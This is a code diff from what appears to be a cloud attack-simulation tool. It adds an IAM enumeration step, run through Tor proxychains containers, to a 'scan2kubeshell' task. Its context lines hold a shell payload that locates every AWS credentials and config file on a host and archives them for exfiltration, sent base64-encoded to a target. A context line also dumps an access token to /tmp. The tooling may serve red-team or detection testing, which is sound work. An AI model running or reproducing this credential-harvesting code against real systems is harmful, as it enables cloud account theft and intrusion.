@@ -232,6 +232,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 
                 if task_name == "scan2kubeshell":
                     container = f'ghcr.io/credibleforce/proxychains-aws-cli:main'
+                    container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                 else:
                     container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                 try:
@@ -544,7 +545,16 @@ echo $BUCKET_URL
             elif task_name == "scan2kubeshell":
                 csp = "aws"
                 enum_exfil_prep_creds(csp, task_name)
-                session.log("running credentialed_access_tor...")
+                session.log("running iam2enum enumeration...")
+                credentialed_access_tor(
+                    csp=csp,
+                    jobname="iam2enum",
+                    cwd=f'/iam2enum',
+                    script=f'iam2enum.sh',
+                    args=""
+                )
+                session.log("iam2enum enumeration complete")
+                session.log("running scan2kubeshell credentialed_access_tor...")
                 credentialed_access_tor(
                     csp=csp,
                     jobname=task_name,
@@ -554,7 +564,7 @@ echo $BUCKET_URL
                 )
                 session.log("credentialed_access_tor complete")
 
-                # create an archive of all kubernetes creds
+                # create an archive of all aws creds
                 payload = 'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
                 session.log("payload loaded and ready")
                 result = run_base64_payload(
